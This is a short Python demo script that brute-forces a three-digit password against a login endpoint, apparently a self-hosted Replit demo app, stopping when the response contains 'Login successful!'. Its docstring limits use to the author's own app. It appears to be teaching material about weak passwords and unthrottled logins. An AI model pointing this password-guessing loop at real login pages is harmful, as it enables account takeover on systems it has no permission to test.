"""
Brute-force demo script — for use ONLY against the demo login app you
hosted yourself (see HOSTING.md). Never point this at a site you don't
own or don't have explicit permission to test.
"""

import os

import requests

# Target the published Replit demo app.
URL = os.environ.get("LOGIN_URL", "https://loginzip--armaans-28.replit.app/login")


def brute_force(url: str) -> str | None:
    session = requests.Session()
    for i in range(1000):
        guess = f"{i:03d}"
        try:
            response = session.post(url, data={"password": guess}, timeout=10)
        except requests.RequestException as exc:
            print(f"Request failed for {guess}: {exc}")
            return None

        if response.status_code == 200 and "Login successful!" in response.text:
            print(f"Password found: {guess}")
            return guess

        # Uncomment this line if you want to see each attempt.
        # print(f"Tried {guess} — failed")

    print("Password not found in the 000–999 range.")
    return None


if __name__ == "__main__":
    print(f"Target URL: {URL}")
    brute_force(URL)
